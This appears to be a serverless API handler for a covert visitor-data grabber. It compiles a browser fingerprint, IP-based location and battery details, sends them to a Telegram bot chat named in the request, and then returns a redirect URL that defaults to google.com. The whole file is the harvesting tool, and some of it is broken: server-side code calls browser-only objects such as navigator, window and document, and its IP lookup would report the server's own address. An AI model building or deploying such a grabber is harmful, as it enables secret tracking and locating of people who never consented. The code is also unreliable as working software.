export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, redirectUrl = 'https://google.com', ...collectedData } = req.body;

    // Process and format the collected data
    const messageParts = [];
    
    // Header
    messageParts.push(
      `🔰 *Opas Labs - Data Report* 🔰`,
      `🆔 Chat ID: ${telegramId}`,
      `🕒 Time: ${new Date().toLocaleString()}`
    );

    // Basic Info - These should always be available
    messageParts.push(`\n🌐 *Basic Info*`);
    messageParts.push(`- Browser: ${collectedData.browser || navigator.userAgent}`);
    messageParts.push(`- Platform: ${collectedData.platform || navigator.platform}`);
    messageParts.push(`- Language: ${collectedData.language || navigator.language}`);
    messageParts.push(`- Timezone: ${collectedData.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone}`);
    messageParts.push(`- Cookies: ${navigator.cookieEnabled ? 'Enabled' : 'Disabled'}`);

    // Hardware Info - More reliable collection
    messageParts.push(`\n💻 *Hardware*`);
    messageParts.push(`- CPU: ${collectedData.cpu || (navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'Unknown')}`);
    messageParts.push(`- RAM: ${collectedData.memory || (navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown')}`);
    messageParts.push(`- Screen: ${collectedData.screen || `${screen.width}x${screen.height}, ${screen.colorDepth}bit`}`);
    messageParts.push(`- Touch: ${'ontouchstart' in window ? 'Yes' : 'No'}`);
    
    // WebGL Info
    const webglInfo = getWebGLInfo();
    messageParts.push(`- WebGL: ${webglInfo.vendor} | ${webglInfo.renderer}`);

    // Network Info - More reliable collection
    const networkInfo = await getNetworkInfo();
    messageParts.push(`\n📶 *Network*`);
    messageParts.push(`- Type: ${networkInfo.type}`);
    messageParts.push(`- Speed: ${networkInfo.effectiveType}`);
    messageParts.push(`- Downlink: ${networkInfo.downlink}`);
    messageParts.push(`- Latency: ${networkInfo.rtt}`);
    messageParts.push(`- Data Saver: ${networkInfo.saveData}`);

    // Location Info - Get fresh IP data if not provided
    if (!collectedData.ip) {
      const ipData = await getIPInfo();
      collectedData.ip = ipData.ip;
      collectedData.city = ipData.city;
      collectedData.region = ipData.region;
      collectedData.country = ipData.country;
    }
    
    messageParts.push(`\n📍 *Approximate Location*`);
    messageParts.push(`- IP: ${collectedData.ip}`);
    if (collectedData.city) messageParts.push(`- City: ${collectedData.city}`);
    if (collectedData.region) messageParts.push(`- Region: ${collectedData.region}`);
    if (collectedData.country) messageParts.push(`- Country: ${collectedData.country}`);

    // Battery Info - Try to get fresh data if not provided
    if (!collectedData.battery) {
      try {
        const battery = await navigator.getBattery();
        collectedData.battery = `${(battery.level * 100).toFixed(0)}%`;
        collectedData.charging = battery.charging ? 'Yes' : 'No';
      } catch {}
    }
    
    if (collectedData.battery) {
      messageParts.push(`\n🔋 *Battery*`);
      messageParts.push(`- Level: ${collectedData.battery}`);
      if (collectedData.charging !== undefined) {
        messageParts.push(`- Charging: ${collectedData.charging}`);
      }
    }

    // Join all message parts
    const messageText = messageParts.join('\n');

    // Send to Telegram
    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: telegramId,
          text: messageText,
          parse_mode: 'Markdown'
        })
      }
    );

    if (!telegramResponse.ok) {
      throw new Error('Failed to send to Telegram');
    }

    res.status(200).json({ 
      success: true,
      redirectUrl: redirectUrl
    });

  } catch (error) {
    console.error('Error processing submission:', error);
    res.status(500).json({ 
      error: 'Failed to process data',
      details: error.message 
    });
  }
};

// Helper functions
async function getIPInfo() {
  try {
    const response = await fetch('https://ipinfo.io/json');
    return await response.json();
  } catch {
    return { ip: 'Unknown' };
  }
}

async function getNetworkInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (connection) {
    return {
      type: connection.type || "Unknown",
      effectiveType: connection.effectiveType || "Unknown",
      downlink: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
      rtt: connection.rtt ? `${connection.rtt} ms` : "Unknown",
      saveData: connection.saveData ? "Enabled" : "Disabled"
    };
  }
  return {
    type: "Unknown",
    effectiveType: "Unknown",
    downlink: "Unknown",
    rtt: "Unknown",
    saveData: "Unknown"
  };
}

function getWebGLInfo() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return { vendor: "Not supported", renderer: "Not supported" };
    
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return {
      vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Blocked",
      renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Blocked"
    };
  } catch {
    return { vendor: "Error", renderer: "Error" };
  }
}
